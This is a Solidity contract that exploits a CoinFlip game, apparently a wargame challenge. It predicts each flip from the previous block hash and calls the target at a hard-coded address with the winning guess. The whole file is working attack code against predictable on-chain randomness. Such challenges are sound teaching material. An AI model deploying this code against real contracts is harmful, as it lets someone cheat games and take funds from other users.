// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8;

//Reasons for current errors might be
// 1. Try without library
// 2. CoinFlip contract revert cause
//import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

interface CoinFlip {

  function flip(bool _guess) external returns (bool);
}

contract CoinFlipExploit {
    //using SafeMath for uint256;

    uint256 lastHash = 0;
    address coinflipContractAddress = 0x1398414B4e69ad775bBaF76AdBDA70Cfb52d4772;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    
    function attemptPsychicGuess() public{
    
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / (FACTOR);

        bool guess = coinFlip == 1 ? true : false;

        if (lastHash != blockValue) {
            CoinFlip(coinflipContractAddress).flip(guess);
            lastHash = blockValue;
        }
        else{
            revert();
        }
    }
}